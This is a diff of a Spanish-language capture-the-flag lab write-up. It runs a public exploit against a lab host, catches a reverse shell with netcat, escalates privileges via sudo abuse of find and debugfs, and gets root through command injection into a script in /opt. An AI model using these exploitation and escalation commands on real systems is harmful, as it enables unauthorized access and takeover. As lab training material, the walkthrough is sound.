@@ -69,12 +69,20 @@ searchsploit -m php/webapps/50082.py
 
 python 50082.py -T 172.18.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
 ```
+<img width="1237" height="347" alt="11" src="https://github.com/user-attachments/assets/79608236-cd21-4ac0-9e97-8af7db973e0d" />
 
-El output nos devuelve una URL con una webshell. Nos ponemos en escucha con netcat y enviamos una reverse shell desde la webshell.
+
+El output nos muestra una url la cuál si entramos nos aparece la siguiente pestaña:
+
+<img width="867" height="568" alt="12" src="https://github.com/user-attachments/assets/15558bbf-271c-4dcd-9000-12a183857db6" />
+
+
+Ahora nos enviamos una reverse shell pero antes nos ponemos en escucha con netcat
 
 ```bash
 nc -lvnp 443
 ```
+<img width="933" height="353" alt="14" src="https://github.com/user-attachments/assets/6644fe63-9d7d-431c-941d-11965c21a498" />
 
 Logramos acceso inicial al sistema.
 
@@ -82,26 +90,40 @@ Logramos acceso inicial al sistema.
 
 ## 3. Escalada de Privilegios
 
-### www-data → rafa
+Una vez dentro, ponemos el comando sudo -l para ver los binarios disponibles, nos muestra el binario “find” pero con el usuario “rafa”
 
-Ejecutamos `sudo -l` y vemos que podemos usar `find` como el usuario **rafa**:
+<img width="782" height="172" alt="15" src="https://github.com/user-attachments/assets/42d5fd99-9a9e-4279-ae4c-9506eacec2f9" />
 
+
+Para explotarlo ingresamos el siguiente comando:
 ```bash
 sudo -u rafa /usr/bin/find . -exec /bin/sh \; -quit
 ```
 
-### rafa → ruben
+<img width="621" height="53" alt="16" src="https://github.com/user-attachments/assets/c214068f-845e-4bfd-a8a8-91b93b9e5a12" />
 
-Volvemos a ejecutar `sudo -l` como rafa y vemos que podemos usar `debugfs` como **ruben**:
+Y si hacemos un sudo -l nos indica que tenemos que pivotar al usuario “ruben”
 
-```bash
+<img width="767" height="168" alt="17" src="https://github.com/user-attachments/assets/c554d904-cc7d-40a4-8839-4f543695d2d0" />
+
+Para pivotar a “ruben” utilizamos los siguientes comando:
+```bash 
 sudo -u ruben /usr/sbin/debugfs
 !/bin/bash
 ```
+<img width="424" height="89" alt="18" src="https://github.com/user-attachments/assets/1e9a571f-c5fc-4b29-ba4c-f3f464c77150" />
 
-### ruben → root
+Al parecer en el directorio /opt se esta ejecutando un script.
 
-En `/opt` encontramos un script que se ejecuta con privilegios. El script compara el input con el número 42, pero podemos inyectar un comando almacenado en una variable de entorno para ejecutarlo como root.
+<img width="759" height="131" alt="19" src="https://github.com/user-attachments/assets/8ce247d4-0642-4ccc-b297-87dbae21e3de" />
+
+
+Que si lo leemos contiene un código el cuál compara el input y si es igual o distinto de 42 imprime un mensaje, por lo que nosotros podemos inyectar un comando que se ejecute a nivel de sistema almacenado en una variable de la siguiente manera:
+
+<img width="371" height="177" alt="20" src="https://github.com/user-attachments/assets/fc06a1c6-7e31-435e-922c-0f39be9ea6b4" />
+
+
+<img width="607" height="151" alt="21" src="https://github.com/user-attachments/assets/aab5a6c6-8d71-48fa-a273-99e1df082230" />
 
 **✅ Máquina rooteada con éxito.**
 
